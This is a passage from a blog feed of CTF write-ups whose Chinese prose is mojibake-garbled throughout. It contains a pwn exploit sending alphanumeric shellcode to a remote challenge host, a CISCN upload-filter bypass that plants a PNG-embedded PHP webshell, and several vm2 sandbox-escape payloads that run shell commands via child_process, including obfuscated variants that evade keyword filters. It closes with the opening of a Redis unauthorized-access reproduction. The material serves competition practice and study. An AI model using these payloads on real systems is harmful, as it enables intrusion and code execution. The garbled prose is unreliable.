=$e;echo(urlencode(str_replace(&quot;i:1&quot;,&quot;i:0&quot;,serialize(array($c,1)))))?&gt;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604165811456.png" alt="image-20220604165811456"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170425296.png" alt="image-20220604170425296"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p>case1,ç¡®ä¿unk_202028å’Œunk_202024ä¸º1ï¼Œ</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174222620.png" alt="image-20220529174222620"></p><p>case2:ï¼Œunk_202028å’Œunk_202028ä¸º1çš„æ—¶å€™æ‰§è¡Œå†™çš„shellcodeï¼Œshellcodeå¿…é¡»ä¸ºå¯è§å­—ç¬¦ï¼š</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174438381.png" alt="image-20220529174438381"></p><p>ç”Ÿæˆshellcodeå¯è§å­—ç¬¦ä¸²ï¼š</p><p><a href="https://github.com/TaQini/alpha3">https://github.com/TaQini/alpha3</a></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140033280.png" alt="image-20220529140033280"></p><p>expï¼š</p><pre><code class="python">from pwn import*context.log_level = &quot;debug&quot;io = remote(&quot;123.56.111.202&quot;,17395)# io = process(&quot;./login&quot;)io.recv()shellcode = &quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;payload = &quot;opt:1\n&quot; + &quot;msg:ro0t1\n&quot;io.sendline(payload)payload = &quot;opt:2\n&quot; + &quot;msg:&quot; + shellcode + &quot;\n&quot;io.sendline(payload)io.interactive()</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140131706.png" alt="image-20220529140131706"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>swiftçš„ASTæ ‘</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201512778.png" alt="image-20220529201512778"></p><p>å‚ç…§swiftcçš„è¾“å‡º</p><p>æ„é€ å‡ºè„šæœ¬</p><pre><code class="c">#include &lt;stdio.h&gt;unsigned char b[] = &#123;88, 35, 88, 225, 7, 201, 57, 94, 77, 56, 75, 168, 72, 218, 64, 91, 16, 101, 32, 207, 73, 130, 74, 128, 76, 201, 16, 248, 41, 205, 103, 84, 91, 99, 79, 202, 22, 131, 63, 255, 20, 16&#125;;unsigned char k[] = &quot;345y&quot;;int main()&#123;    for (int i = 0; i &lt; 42 - 3; i++)    &#123;        unsigned char tmp = k[0];        k[0] = k[1];        k[1] = k[2];        k[2] = k[3];        k[3] = tmp;    &#125;    for (int i = 42 - 4; i &gt;= 0; i--)    &#123;        unsigned char r0 = b[i + 0], r1 = b[i + 1], r2 = b[i + 2], r3 = b[i + 3];        unsigned char tmp = k[3];        k[3] = k[2];        k[2] = k[1];        k[1] = k[0];        k[0] = tmp;        b[i + 0] = r2 ^ k[2];        b[i + 1] = r3 ^ k[3];        b[i + 2] = ((k[0] + (b[i + 0] &gt;&gt; 4)) &amp; 0xff) ^ r0;        b[i + 3] = ((k[1] + (b[i + 1] &gt;&gt; 2)) &amp; 0xff) ^ r1;    &#125;    for (int i = 0; i &lt; 42; i++)    &#123;        printf(&quot;%c&quot;, b[i]);    &#125;    return 0;&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201614424.png" alt="image-20220529201614424"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a href=&quot;#crypto&quot; class=&quot;headerlink&quot; title=&quot;crypto&quot;&gt;&lt;/a&gt;crypto&lt;/h1&gt;&lt;h2 id=&quot;ç­¾åˆ°&quot;&gt;&lt;a href=&quot;#ç­¾åˆ°&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="åˆ·é¢˜" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="ciscn" scheme="https://sakurahack-y.github.io/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>webéšç¼˜åˆ·</title>
    <link href="https://sakurahack-y.github.io/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/"/>
    <id>https://sakurahack-y.github.io/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/</id>
    <published>2022-05-19T04:22:18.000Z</published>
    <updated>2022-06-27T02:33:28.870Z</updated>
    
    <content type="html"><![CDATA[<p>å”‰ï¼Œciscnå¿«å¼€äº†ï¼Œctfå¤ªå·äº†ï¼Œåšåšä»¥å‰é¢˜ç»ƒä¸€ä¸‹æ‰‹å§</p><p>[TOC]</p><h1 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h1><p>æºç :</p><pre><code class="php">&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) &#123;    if ($_FILES[&#39;postedFile&#39;][&#39;size&#39;] &gt; 1024*512) &#123;        die(&quot;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&quot;);    &#125;    $imageinfo = getimagesize($_FILES[&#39;postedFile&#39;][&#39;tmp_name&#39;]);    if ($imageinfo === FALSE) &#123;        die(&quot;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&quot;);    &#125;    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;        die(&quot;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&quot;);    &#125;    $fileName=urldecode($_FILES[&#39;postedFile&#39;][&#39;name&#39;]);    if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123;        die(&quot;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&quot;);    &#125;    $imagePath = &quot;image/&quot; . mb_strtolower($fileName);    if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123;        echo &quot;upload success, image at $imagePath&quot;;    &#125; else &#123;        die(&quot;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&quot;);    &#125;&#125;</code></pre><p>å®¡è®¡ä¸‹è¿™ä¸ªä»£ç ï¼Œä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œæ ¡éªŒå¤§å°â€“&gt;æ ¡éªŒå›¾ç‰‡é«˜å’Œå®½â€“&gt;è¿‡æ»¤â€™câ€™,â€™iâ€™,â€™hâ€™,â€™phâ€™â€“&gt;æˆåŠŸä¸Šä¼ orå¤±è´¥</p><p>æ— æ³•ä¸Šä¼ phpğŸï¼Œæ— æ³•åˆ©ç”¨.htacesså’Œ.user.iniï¼Œ</p><p>é‚£å°±</p><p>æ‰«æä¸€ä¸‹ç›®å½•ï¼Œåˆå‘ç°äº†ä¸€ä¸ªæºç </p><p>example.php</p><pre><code class="php"> &lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) &#123;    $zip = new \ZipArchive();    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;        die(&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;);    &#125;    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;        die (&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;);    &#125;    echo &quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;;    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);    $zip-&gt;extractTo($pos_for_zip);    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(&quot;$pos_for_zip/*&quot;);    foreach($files as $file)&#123;        if (is_dir($file)) &#123;            continue;        &#125;        $first = imagecreatefrompng($file);        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [&#39;x&#39; =&gt; 0, &#39;y&#39; =&gt; 0, &#39;width&#39; =&gt; $size, &#39;height&#39; =&gt; $size]);        if ($second !== FALSE) &#123;            $final_name = pathinfo($file)[&quot;basename&quot;];            imagepng($second, &#39;example/&#39;.$final_name);            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p>è¿™æ®µä»£ç çš„å¤§è‡´ä½œç”¨æ˜¯è§£å‹ä¸€ä¸ªzipæ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å°±è¦æ€è€ƒæ˜¯å¦å¯ä»¥æŠŠphpæ”¾å…¥zipä¸­ï¼Œé‚£å°±éœ€è¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶ï¼Œä½†æ˜¯iè¢«è¿‡æ»¤</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨mb_strtolowerå‡½æ•°ç»•è¿‡ï¼Œå®ƒæ˜¯æ”¯æŒUnicodeçš„</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123323158.png" alt="image-20220519123323158"></p><p>å¤§è‡´çš„æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªå­—ç¬¦Unicodeå»æ›¿æ¢i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123635184.png" alt="image-20220519123635184"></p><pre><code class="php">&lt;?phpvar_dump(mb_strtolower(&#39;Ä°&#39;)===&#39;i&#39;);?&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123728624.png" alt="image-20220519123728624"></p><p>è¯¦è§:<a href="https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/">https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/</a></p><p>ç»•è¿‡äº†iä¹‹åæˆ‘ä»¬è¿˜è¦ç»•è¿‡é«˜å’Œå®½</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨xmbç»•è¿‡</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>é™¤æ­¤ä¹‹å¤–å®ƒè¿˜æœ‰ä¸€ä¸ªå‡½æ•°è¿‡æ»¤ï¼Œé˜»æ­¢æˆ‘ä»¬åœ¨å›¾ç‰‡ä¸­æ”¾å…¥æ¶æ„çš„php</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519124806416.png" alt="image-20220519124806416"></p><p>é€šå¸¸ï¼Œç³»ç»Ÿåœ¨å®ç°å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œä¸ºäº†é˜²èŒƒç”¨æˆ·ä¸Šä¼ å«æœ‰æ¶æ„ php ä»£ç çš„å›¾ç‰‡ï¼Œå¯é‡‡ç”¨ gd åº“é‡å»ºå›¾ç‰‡ï¼Œgd åº“é‡å»ºå›¾ç‰‡çš„ä¸€ç³»åˆ—å‡½æ•° imagecreatefrom*ï¼Œä¼šæ£€æŸ¥å›¾ç‰‡è§„èŒƒï¼ŒéªŒè¯å›¾ç‰‡åˆæ³•æ€§ï¼Œä»¥æ­¤æŠµå¾¡å›¾ç‰‡ä¸­å«æœ‰æ¶æ„ php ä»£ç çš„æ”»å‡»ã€‚</p><p>å¦‚æœç›´æ¥åœ¨å›¾ç‰‡æœ€åå†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä¼šè¢«GDåº“ç»™å»æ‰ã€‚ç»•è¿‡GDåº“å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="http://www.vuln.cn/6411">http://www.vuln.cn/6411</a></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…·:<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator%E6%9D%A5%E5%B8%AE%E5%8A%A9%E6%88%91%E4%BB%AC%E7%BB%95%E8%BF%87">https://github.com/huntergregal/PNG-IDAT-Payload-Generatoræ¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡</a></p><p>ä½¿ç”¨è„šæœ¬ç”Ÿæˆå›¾ç‰‡ğŸ</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125046671.png" alt="image-20220519125046671"></p><p>ä¿®æ”¹åç¼€ä¸ºphpå¹¶æ”¾å…¥zipä¸­</p><p>åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œé¢å†™å…¥</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>æ³¨:ç¬¬ä¸€è¡Œè¦ç©ºå‡ºæ¥æ¢è¡Œï¼Œä¸ç„¶æ— æ³•è¯†åˆ«</p><p>ç„¶åå°†txtè¿½åŠ åˆ°zipå</p><pre><code>copy shell.zip/b+1.txt/a dd.zip</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130016829.png" alt="image-20220519130016829"></p><p>ç„¶åå°±å¯ä»¥æ¥ä¸Šä¼ äº†</p><p>è‡ªå·±æ„å»ºä¸€ä¸ªhtml postæ–‡ä»¶ä¸Šä¼ ç•Œé¢:</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POSTæ•°æ®åŒ…POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://05b1ebab-02ca-4b72-bf12-1b21695d609d.node4.buuoj.cn:81/upload.php?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;    &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125541638.png" alt="image-20220519125541638"></p><p>æŠ“åŒ…ï¼Œä¿®æ”¹i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130133680.png" alt="image-20220519130133680"></p><p>æˆåŠŸä¸Šä¼ </p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130059694.png" alt="image-20220519130059694"></p><p>ç„¶åä½¿ç”¨exampleé¡µé¢è§£å‹</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519133936518.png" alt="image-20220519133936518"></p><p>æˆåŠŸè§£å‹ï¼Œè¿è¡Œä¸‹</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134029090.png" alt="image-20220519134029090"></p><p>ä¸‹é¢æ¥æ‰¾flag</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134213040.png" alt="image-20220519134213040"></p><p>è¯»å–ä¸‹è¿™ä¸ªæ–‡ä»¶</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134241496.png" alt="image-20220519134241496"></p><h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519144418792.png" alt="image-20220519144418792"></p><p>çœŸçš„æ˜¯phpå—ï¼Ÿ</p><p>æ—¢ç„¶è¿™ä¹ˆæç¤ºäº†é‚£è‚¯å®šä¸æ˜¯ï¼Œæµ‹ä¸€ä¸‹node.js</p><p>ä¼ å…¥ Error().stack</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519145031732.png" alt="image-20220519145031732"></p><p>ç¡®å®æ˜¯jsï¼Œæ˜¯vm2çš„æ²™ç®±é€ƒé€¸é—®é¢˜</p><p>githubæœ‰ç°æˆpoc:</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>æˆ–è€…</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    try&#123;        Buffer.from(new Proxy(&#123;&#125;, &#123;            getOwnPropertyDescriptor()&#123;                throw f=&gt;f.constructor(&quot;return process&quot;)();            &#125;        &#125;));    &#125;catch(e)&#123;        return e(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>æ„é€ æˆfunctionä¼ å…¥</p><pre><code class="js">(function() &#123;        &quot;use strict&quot;;    const &#123;VM&#125; = require(&#39;vm2&#39;);    const untrusted = &#39;(&#39; + function()&#123;        TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();        try&#123;            Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;        &#125;catch(e)&#123;            return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();        &#125;    &#125;+&#39;)()&#39;;    try&#123;        console.log(new VM().run(untrusted));    &#125;catch(x)&#123;        console.log(x);    &#125;&#125;)()</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519150121586.png" alt="image-20220519150121586"></p><p>åº”è¯¥å…³é”®å­—è¢«è¿‡æ»¤äº†</p><p>ç»•è¿‡:</p><p>1ã€åœ¨å…³é”®å­—å­—æ¯ä¸ŠåŠ ä¸Š `</p><pre><code class="js">(()=&gt;&#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &#125;catch(e)&#123; return e[`a`](()=&gt;&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+/flag`)[`toString`](); &#125; &#125;)()</code></pre><p>2ã€javascriptçš„æ¨¡ç‰ˆæ–‡å­—ç»•è¿‡</p><p>prototypeå˜æˆ`${`${`prototyp`}e`}`</p><pre><code class="js">(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å”‰ï¼Œciscnå¿«å¼€äº†ï¼Œctfå¤ªå·äº†ï¼Œåšåšä»¥å‰é¢˜ç»ƒä¸€ä¸‹æ‰‹å§&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;CISCN2021-Quals-upload&quot;&gt;&lt;a href=&quot;#CISCN2021-Quals-upload&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="åˆ·é¢˜" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°</title>
    <link href="https://sakurahack-y.github.io/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-26T14:57:50.000Z</published>
    <updated>2022-04-30T16:56:39.911Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="redisä»‹ç»"><a href="#redisä»‹ç»" class="headerlink" title="redisä»‹ç»"></a>redisä»‹ç»</h1><p>Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€ Key-Valueæ•°æ®åº“ã€‚å’ŒMemcachedç±»ä¼¼ï¼Œå®ƒæ”¯æŒå­˜å‚¨çš„value ç±»å‹ç›¸å¯¹æ›´å¤šï¼ŒåŒ…æ‹¬ string(å­—ç¬¦ä¸²)ã€list ( é“¾è¡¨)ã€ set(é›†åˆ)ã€zset(sorted set â€“ æœ‰åºé›†åˆ)å’Œ  hashï¼ˆå“ˆå¸Œç±»å‹ï¼‰ã€‚è¿™äº›æ•°æ®ç±»å‹éƒ½æ”¯æŒpush/pop ã€ add/remove  åŠå–äº¤é›†å¹¶é›†å’Œå·®é›†åŠæ›´ä¸°å¯Œçš„æ“ä½œï¼Œè€Œä¸”è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œ redisæ”¯æŒå„ç§ä¸åŒæ–¹å¼çš„æ’åºã€‚ä¸ memcached  ä¸€æ ·ï¼Œä¸ºäº†ä¿è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚åŒºåˆ«çš„æ˜¯ redis  ä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº† master-slave ( ä¸»ä»)åŒæ­¥ã€‚</p><h1 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h1><p>Rediså› é…ç½®ä¸å½“å¯ä»¥å¯¼è‡´æœªæˆæƒè®¿é—®ï¼Œè¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨ã€‚å½“å‰æµè¡Œçš„é’ˆå¯¹Redisæœªæˆæƒè®¿é—®çš„ä¸€ç§æ–°å‹æ”»å‡»æ–¹å¼ï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œå¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨æƒé™è¢«è·å–å’Œæ•°æ®åˆ é™¤ã€æ³„éœ²æˆ–åŠ å¯†å‹’ç´¢äº‹ä»¶å‘ç”Ÿï¼Œä¸¥é‡å±å®³ä¸šåŠ¡æ­£å¸¸æœåŠ¡ã€‚ã€€ã€€éƒ¨åˆ†æœåŠ¡å™¨ä¸Šçš„Redis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯è®¤è¯ï¼ˆè¿™æ˜¯Redis  çš„é»˜è®¤é…ç½®ï¼‰ï¼Œä»¥åŠè¯¥ç«¯å£å¯ä»¥é€šè¿‡å…¬ç½‘ç›´æ¥è®¿é—®ï¼Œå¦‚æœæ²¡æœ‰é‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œå°†ä¼šå¯¼è‡´ Redis  æœåŠ¡ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¯èƒ½é€ æˆå…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥åœ¨éæˆæƒæƒ…å†µä¸‹ç›´æ¥è®¿é—®RedisæœåŠ¡å¹¶è¿›è¡Œç›¸å…³æ“ä½œã€‚ç›®å‰æ¯”è¾ƒä¸»æµçš„æ¡ˆä¾‹ï¼šyam2 minerd  æŒ–çŸ¿ç¨‹åºï¼Œè¿˜æœ‰åœ¨å¤šæ¬¡åº”æ€¥äº‹ä»¶ä¸­å‘ç°å¤§é‡çš„watch-smartdæŒ–çŸ¿æœ¨é©¬ã€‚</p><h1 id="æ¼æ´äº§ç”Ÿæ¡ä»¶"><a href="#æ¼æ´äº§ç”Ÿæ¡ä»¶" class="headerlink" title="æ¼æ´äº§ç”Ÿæ¡ä»¶"></a>æ¼æ´äº§ç”Ÿæ¡ä»¶</h1><p>1ã€redisæœåŠ¡ç»‘å®šåœ¨0.0.0.0:6379ç«¯å£ï¼Œè€Œä¸”ä¿¡ä»»äº†å…¶ä»–IPï¼Œå¯¼è‡´äº†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Š</p><p>2ã€æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼Œå¯ä»¥å…å¯†ç™»é™†RedisæœåŠ¡</p><h1 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h1><p>1ã€å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæ¶æ„æ‰§è¡Œflushallæ¸…ç©ºæ‰€æœ‰æ•°æ®</p><p>2ã€é€šè¿‡Evalæ‰§è¡ŒLuaä»£ç ï¼Œé€šè¿‡å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶</p><p>3ã€å¦‚æœRedisæœåŠ¡ä»¥rootèº«ä»½è¿è¡Œï¼Œå¯ä»¥ç»™rootç”¨æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»é™†æœåŠ¡å™¨</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>é¶æœº: centos7.5 é˜¿é‡Œäº‘ 39.105.x.x    